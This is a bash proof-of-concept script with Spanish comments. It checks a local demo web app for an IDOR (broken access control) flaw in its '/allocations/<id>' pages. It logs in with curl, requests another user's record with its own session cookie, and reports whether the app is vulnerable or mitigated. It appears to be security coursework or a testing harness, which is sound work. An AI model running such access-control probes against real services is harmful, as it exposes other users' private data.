#!/usr/bin/env bash
# V1 — Broken Access Control (IDOR). Dueño: JuanFra. OWASP A01:2025.
# Uso: SOLO contra la instancia LOCAL.
#   POC_PASS=<clave_user1> ./poc-scripts/v1_idor.sh                             # :4000 vulnerable
#   BASE=http://localhost:4001 POC_PASS=<clave_user1> ./poc-scripts/v1_idor.sh  # :4001 mitigada
# Variables: BASE, POC_USER (def. user1), POC_PASS (obligatoria), OWN_ID (def. 2), OTHER_ID (def. 3),
#            MISSING_ID (def. 9999, id inexistente)
# Casos: propio (debe dar 200), ajeno (veredicto), inexistente (informativo), ajeno sin cookie (debe redirigir a login)
# Salida: 0 = mitigado, 1 = vulnerable, 2 = error
set -euo pipefail

BASE="${BASE:-http://localhost:4000}"
POC_USER="${POC_USER:-user1}"
POC_PASS="${POC_PASS:?define POC_PASS (clave demo de user1, ver db-reset.js)}"
OWN_ID="${OWN_ID:-2}"
OTHER_ID="${OTHER_ID:-3}"
MISSING_ID="${MISSING_ID:-9999}"

JAR="$(mktemp)"; BODY="$(mktemp)"
trap 'rm -f "$JAR" "$BODY"' EXIT

echo "[V1] objetivo: $BASE  usuario: $POC_USER  (fecha: $(date -u +%FT%TZ))"

# 1. Login legítimo y guardado de la cookie de sesión
code=$(curl -s -o /dev/null -w "%{http_code}" -c "$JAR" \
  --data-urlencode "userName=$POC_USER" --data-urlencode "password=$POC_PASS" "$BASE/login")
echo "[V1] POST /login -> $code"
if [ "$code" != "302" ]; then
  echo "[V1] ERROR: login fallido (se esperaba 302)"; exit 2
fi

names() { grep -o 'Asset Allocations for [^<]*' "$BODY" || true; }

# 2. Recurso propio
own_code=$(curl -s -b "$JAR" -o "$BODY" -w "%{http_code}" "$BASE/allocations/$OWN_ID")
own_names=$(names)
echo "[V1] GET /allocations/$OWN_ID (propio) -> $own_code | ${own_names:-<sin datos>}"

# 3. Recurso de OTRO usuario con la sesión propia
oth_code=$(curl -s -b "$JAR" -o "$BODY" -w "%{http_code}" "$BASE/allocations/$OTHER_ID")
oth_names=$(names)
echo "[V1] GET /allocations/$OTHER_ID (ajeno)  -> $oth_code | ${oth_names:-<sin datos>}"

# 4. Id inexistente con la sesión propia (informativo)
mis_code=$(curl -s -b "$JAR" -o "$BODY" -w "%{http_code}" "$BASE/allocations/$MISSING_ID")
mis_names=$(names)
echo "[V1] GET /allocations/$MISSING_ID (inexistente) -> $mis_code | ${mis_names:-<sin datos>}"

# 5. Recurso ajeno SIN cookie: debe redirigir a /login (302)
anon_code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/allocations/$OTHER_ID")
echo "[V1] GET /allocations/$OTHER_ID (sin cookie) -> $anon_code (esperado 302 a /login)"

# 6. Veredicto
if [ "$anon_code" = "200" ]; then
  echo "[V1] RESULTADO: VULNERABLE - recurso accesible sin sesion"; exit 1
fi
if [ "$oth_code" = "200" ] && [ -n "$oth_names" ] && [ "$oth_names" != "$own_names" ]; then
  echo "[V1] RESULTADO: VULNERABLE - se leyeron datos de otro usuario (A01:2025)"
  exit 1
fi
if [ "$own_code" != "200" ] || [ -z "$own_names" ]; then
  echo "[V1] ERROR: regresion - el usuario no ve sus propios datos"; exit 2
fi
echo "[V1] RESULTADO: MITIGADO - no se entregan datos de otro usuario (ajeno -> $oth_code)"
exit 0
